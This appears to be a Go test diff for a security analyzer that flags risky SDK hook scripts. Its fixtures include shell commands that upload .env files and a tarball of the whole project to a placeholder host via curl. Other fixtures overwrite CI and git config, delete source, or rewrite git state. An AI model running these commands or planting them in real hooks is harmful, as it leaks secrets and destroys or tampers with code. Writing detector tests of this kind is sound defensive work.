@@ -124,6 +124,190 @@ func TestProjectInPlaceModificationIsRisk(t *testing.T) {
 	}
 }
 
+func TestProjectControlFileModificationIsHighRisk(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{
+		"printf payload > Makefile\n",
+		"printf payload > /project/.github/workflows/ci.yml\n",
+		"printf payload > /project/.git/config\n",
+		"cp /tmp/tool /project/scripts/build.sh\n",
+	} {
+		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-control-file-modification")
+		if got == nil || got.Severity != "high" || got.Weight != 50 {
+			t.Fatalf("project control modification = %#v for %q", got, content)
+		}
+	}
+
+	for _, content := range []string{
+		"printf generated > dist/package.txt\n",
+		"git clone https://example.invalid/repo vendor/repo\n",
+		"printf generated > /tmp/Makefile\n",
+	} {
+		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-control-file-modification"); got != nil {
+			t.Errorf("benign/non-project write matched control modification: content=%q finding=%#v", content, got)
+		}
+	}
+}
+
+func TestProjectSourceDeletionIsHighRisk(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{"rm -rf src\n", "rm -- /project/Makefile\n"} {
+		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-source-deletion")
+		if got == nil || got.Severity != "high" {
+			t.Fatalf("project deletion = %#v for %q", got, content)
+		}
+	}
+
+	for _, content := range []string{"rm -rf dist\n", "rm -f /tmp/Makefile\n"} {
+		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-source-deletion"); got != nil {
+			t.Errorf("generated/non-project deletion matched: content=%q finding=%#v", content, got)
+		}
+	}
+}
+
+func TestProjectAliasReusesMutationFindings(t *testing.T) {
+	t.Parallel()
+
+	content := `ln -s /project /tmp/workspace
+cp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml
+rm -rf /tmp/workspace/src
+`
+	findings := finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject))
+	control := findFinding(findings, "risk.project-control-file-modification")
+	deletion := findFinding(findings, "risk.project-source-deletion")
+	if control == nil || control.Evidence[0].NormalizedValue != "/project/.github/workflows/alias.yml" {
+		t.Fatalf("alias control modification = %#v; all = %#v", control, findings)
+	}
+	if deletion == nil || deletion.Evidence[0].NormalizedValue != "/project/src" {
+		t.Fatalf("alias source deletion = %#v; all = %#v", deletion, findings)
+	}
+	for _, got := range []*finding.Finding{control, deletion} {
+		var alias bool
+		for _, evidence := range got.Evidence {
+			alias = alias || evidence.Type == "alias" && evidence.NormalizedValue != ""
+		}
+		if !alias {
+			t.Errorf("missing alias evidence: %#v", got.Evidence)
+		}
+	}
+}
+
+func TestNonProjectAndCyclicAliasesDoNotCreateProjectFindings(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{
+		"ln -s /tmp/source /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml\n",
+		"ln -s /tmp/b /tmp/a\nln -s /tmp/a /tmp/b\ncp /tmp/ci.yml /tmp/a/.github/workflows/alias.yml\n",
+		"ln -s /project /tmp/workspace\nrm /tmp/workspace\ncp /tmp/ci.yml /tmp/workspace/.github/workflows/alias.yml\n",
+	} {
+		findings := finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject))
+		if got := findFinding(findings, "risk.project-control-file-modification"); got != nil {
+			t.Errorf("non-Project/invalidated alias matched control modification: content=%q finding=%#v", content, got)
+		}
+	}
+}
+
+func TestProjectExecutableCreationRequiresWriteAndChmod(t *testing.T) {
+	t.Parallel()
+
+	positive := "printf '#!/bin/sh' > scripts/tool.sh\nchmod +x scripts/tool.sh\n"
+	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, positive, sdk.HookSetupProject)), "risk.project-executable-created")
+	if got == nil || got.Severity != "high" || len(got.Evidence) != 2 {
+		t.Fatalf("project executable finding = %#v", got)
+	}
+
+	for _, content := range []string{
+		"chmod +x scripts/existing.sh\n",
+		"printf '#!/bin/sh' > scripts/tool.sh\n",
+		"printf '#!/bin/sh' > /tmp/tool\nchmod +x /tmp/tool\n",
+	} {
+		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-executable-created"); got != nil {
+			t.Errorf("uncorrelated executable matched: content=%q finding=%#v", content, got)
+		}
+	}
+}
+
+func TestProjectPermissionModificationIsRisk(t *testing.T) {
+	t.Parallel()
+
+	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, "chmod 0600 config.txt\n", sdk.HookSetupProject)), "risk.project-permission-modification")
+	if got == nil || got.Severity != "medium" || got.Weight != 25 {
+		t.Fatalf("project permission finding = %#v", got)
+	}
+	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, "chmod 0600 /tmp/config.txt\n", sdk.HookSetupProject)), "risk.project-permission-modification"); got != nil {
+		t.Fatalf("non-project permission matched: %#v", got)
+	}
+}
+
+func TestProjectVCSStateRewriteIsHighRisk(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{
+		"git reset --hard HEAD\n",
+		"git -C /project clean -ffdx\n",
+		"git remote set-url origin https://example.invalid/repo.git\n",
+		"git update-index --skip-worktree package.json\n",
+	} {
+		got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-vcs-state-rewrite")
+		if got == nil || got.Severity != "high" || got.Weight != 50 {
+			t.Fatalf("VCS rewrite = %#v for %q", got, content)
+		}
+	}
+
+	for _, content := range []string{
+		"git status\n",
+		"git diff\n",
+		"git -C /tmp/repo reset --hard HEAD\n",
+	} {
+		if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-vcs-state-rewrite"); got != nil {
+			t.Errorf("read-only/non-project Git matched: content=%q finding=%#v", content, got)
+		}
+	}
+}
+
+func TestStateLifecycleRisks(t *testing.T) {
+	t.Parallel()
+
+	save := analyzedSDK(t, `cp /project/.env "$SDK_STATE_DIR/archive/project.env"
+cp /project/scripts/restore.sh "$SDK_STATE_DIR/restore.sh"
+`, sdk.HookSaveState)
+	restore := analyzedSDK(t, `install -m 0755 "$SDK_STATE_DIR/restore.sh" /project/scripts/post-restore.sh
+cp "$SDK_STATE_DIR/archive/project.env" /project/.restored-environment
+`, sdk.HookRestoreState)
+	save.Hooks = append(save.Hooks, restore.Hooks...)
+	findings := finding.AnalyzeSDK(save)
+	secret := findFinding(findings, "risk.project-secret-persisted-to-state")
+	project := findFinding(findings, "risk.state-content-to-project")
+	if secret == nil || secret.Severity != "high" {
+		t.Fatalf("secret state finding = %#v; all = %#v", secret, findings)
+	}
+	if project == nil || project.Severity != "high" || len(project.Evidence) < 3 {
+		t.Fatalf("state Project finding = %#v; all = %#v", project, findings)
+	}
+	if project.Evidence[1].ID != "state-flow" || project.Evidence[2].NormalizedValue != "/project/scripts/post-restore.sh" {
+		t.Errorf("state flow evidence = %#v", project.Evidence)
+	}
+}
+
+func TestOrdinaryStateCacheRestoreIsNotHighRisk(t *testing.T) {
+	t.Parallel()
+
+	save := analyzedSDK(t, `cp /tmp/compiler-cache "$SDK_STATE_DIR/compiler-cache"
+`, sdk.HookSaveState)
+	restore := analyzedSDK(t, `cp "$SDK_STATE_DIR/compiler-cache" /project/.cache/compiler-cache
+`, sdk.HookRestoreState)
+	save.Hooks = append(save.Hooks, restore.Hooks...)
+	findings := finding.AnalyzeSDK(save)
+	if got := findFinding(findings, "risk.project-secret-persisted-to-state"); got != nil {
+		t.Errorf("ordinary cache matched secret persistence: %#v", got)
+	}
+	if got := findFinding(findings, "risk.state-content-to-project"); got != nil {
+		t.Errorf("ordinary cache matched control restoration: %#v", got)
+	}
+}
+
 func TestToolchainSearchOrderHijackRequiresCorrelatedBehavior(t *testing.T) {
 	t.Parallel()
 
@@ -177,6 +361,24 @@ func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
 				t.Errorf("sensitive flow was counted again as generic project exfiltration: %#v", generic)
 			}
 		})
+	}
+}
+
+func TestFunctionArgumentSecretExfiltration(t *testing.T) {
+	t.Parallel()
+
+	content := `send_secret() {
+  local secret_path="$1"
+  curl --form "secret=@${secret_path}" https://example.invalid/upload
+}
+send_secret /project/.env
+`
+	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-secret-exfiltration")
+	if got == nil || got.Severity != "critical" || got.Weight != 90 {
+		t.Fatalf("function secret exfiltration = %#v", got)
+	}
+	if got.Evidence[0].NormalizedValue != "/project/.env" || got.Evidence[len(got.Evidence)-1].ID != "external-send" {
+		t.Errorf("function secret evidence = %#v", got.Evidence)
 	}
 }
 
@@ -250,6 +452,59 @@ func TestProjectDataExfiltrationFlowVariants(t *testing.T) {
 				t.Errorf("project exfiltration evidence = %#v", got.Evidence)
 			}
 		})
+	}
+}
+
+func TestProjectCollectionArtifactExfiltration(t *testing.T) {
+	t.Parallel()
+
+	content := `find /project -type f -print0 > /tmp/project-files.list
+tar --null --files-from=/tmp/project-files.list --create --gzip --file=/tmp/project-snapshot.tar.gz
+cp /tmp/project-snapshot.tar.gz /tmp/staged-snapshot.tar.gz
+curl --upload-file /tmp/staged-snapshot.tar.gz https://example.invalid/upload
+`
+	got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration")
+	if got == nil || got.Severity != "high" || got.Weight != 50 {
+		t.Fatalf("project collection finding = %#v", got)
+	}
+	if got.Evidence[0].ID != "project-read" || got.Evidence[0].NormalizedValue != "/project" || got.Evidence[len(got.Evidence)-1].ID != "external-send" {
+		t.Fatalf("project collection evidence endpoints = %#v", got.Evidence)
+	}
+	var archive, staged bool
+	for _, evidence := range got.Evidence {
+		if evidence.Type != "artifact-flow" {
+			continue
+		}
+		archive = archive || evidence.NormalizedValue == "/tmp/project-snapshot.tar.gz"
+		staged = staged || evidence.NormalizedValue == "/tmp/staged-snapshot.tar.gz"
+	}
+	if !archive || !staged {
+		t.Errorf("project collection artifact chain = %#v", got.Evidence)
+	}
+}
+
+func TestNonProjectArchiveUploadIsNotProjectExfiltration(t *testing.T) {
+	t.Parallel()
+
+	content := `find /tmp/public -type f -print0 > /tmp/public-files.list
+tar --null --files-from=/tmp/public-files.list --create --file=/tmp/public.tar
+curl --upload-file /tmp/public.tar https://example.invalid/upload
+`
+	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration"); got != nil {
+		t.Errorf("non-project archive upload matched project exfiltration: %#v", got)
+	}
+}
+
+func TestDeletedCollectionArtifactCutsProjectFlow(t *testing.T) {
+	t.Parallel()
+
+	content := `find /project -type f -print0 > /tmp/project-files.list
+rm /tmp/project-files.list
+tar --files-from=/tmp/project-files.list --create --file=/tmp/project.tar
+curl --upload-file /tmp/project.tar https://example.invalid/upload
+`
+	if got := findFinding(finding.AnalyzeSDK(analyzedSDK(t, content, sdk.HookSetupProject)), "risk.project-data-exfiltration"); got != nil {
+		t.Errorf("deleted artifact continued project flow: %#v", got)
 	}
 }
 
